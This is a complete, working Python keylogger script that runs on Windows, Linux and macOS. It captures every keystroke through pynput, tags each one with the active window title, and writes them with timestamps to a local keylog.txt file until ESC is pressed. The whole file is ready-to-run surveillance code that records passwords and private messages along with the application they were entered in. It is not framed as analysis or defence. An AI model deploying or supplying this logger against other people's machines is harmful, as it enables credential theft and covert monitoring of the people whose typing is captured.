# -*- coding: utf-8 -*-

from datetime import datetime
from pynput import keyboard
import platform

# Global variable to keep track of the last active window title
last_window_title = ""


def get_active_window_title():
    """
    Retourne le titre de la fenêtre active selon l'OS.
    - Windows: pygetwindow
    - Linux (X11): python-xlib
    - macOS (Darwin): Quartz + AppKit (pyobjc)
    En cas d'erreur ou de bureau sans fenêtre, renvoie "Desktop".
    """
    system = platform.system()

    # --- Windows ---
    if system == "Windows":
        try:
            import pygetwindow as gw
            active_window = gw.getActiveWindow()
            if active_window is None:
                return "Desktop"
            title = active_window.title or ""
            if title == "Program Manager" or title == "":
                return "Desktop"
            return title
        except Exception:
            return "Desktop"

    # --- Linux (X11) ---
    elif system == "Linux":
        try:
            from Xlib import display, X
            d = display.Display()
            root = d.screen().root
            NET_ACTIVE_WINDOW = d.intern_atom('_NET_ACTIVE_WINDOW')
            prop = root.get_full_property(NET_ACTIVE_WINDOW, X.AnyPropertyType)
            if not prop:
                return "Desktop"
            win_id = prop.value[0]
            if win_id == 0:
                return "Desktop"
            window = d.create_resource_object('window', win_id)

            # Try _NET_WM_NAME (utf-8) first
            NET_WM_NAME = d.intern_atom('_NET_WM_NAME')
            wm_name_prop = window.get_full_property(NET_WM_NAME, X.AnyPropertyType)
            if wm_name_prop:
                name = wm_name_prop.value
                if isinstance(name, bytes):
                    try:
                        return name.decode('utf-8')
                    except Exception:
                        return name.decode(errors='ignore')
                return str(name)

            # Fallback to WM_NAME
            try:
                wm_name = window.get_wm_name()
                if wm_name:
                    return wm_name
            except Exception:
                pass

            return "Desktop"
        except Exception:
            return "Desktop"

    # --- macOS (Darwin) ---
    elif system == "Darwin":
        try:
            from AppKit import NSWorkspace
            from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionAll, kCGNullWindowID

            active_app = NSWorkspace.sharedWorkspace().activeApplication()
            pid = active_app.get('NSApplicationProcessIdentifier')

            # Get all windows and find one matching the active app pid and having a name
            window_list = CGWindowListCopyWindowInfo(kCGWindowListOptionAll, kCGNullWindowID)
            if window_list:
                for w in window_list:
                    if w.get('kCGWindowOwnerPID') == pid:
                        name = w.get('kCGWindowName')
                        if name:
                            return name

            # Fallback: return app name if no window title found
            app_name = active_app.get('NSApplicationName')
            if app_name:
                return app_name
            return "Desktop"
        except Exception:
            return "Desktop"

    # --- Other / unknown OS ---
    else:
        return "Desktop"


def on_press(key):
    """
    This function is called every time a key is pressed.
    It logs the key and the active window.
    """
    global last_window_title
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    current_window_title = get_active_window_title()

    try:
        with open('keylog.txt', 'a', encoding='utf-8') as f:
            if current_window_title != last_window_title:
                f.write(f'\n--- Window changed to: [{current_window_title}] at {timestamp} ---\n')
                last_window_title = current_window_title

            if hasattr(key, 'char') and key.char:
                f.write(f'[{timestamp}] Key: {key.char}\n')
            else:
                f.write(f'[{timestamp}] Special: {key}\n')

    except Exception as e:
        print(f"Error writing to log file: {e}")


def on_release(key):
    """
    This function is called every time a key is released.
    It stops the listener if the Escape key is pressed.
    """
    if key == keyboard.Key.esc:
        print("Escape key pressed. Stopping keylogger.")
        return False


# --- Main execution block ---
if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    print("Keylogger stopped.")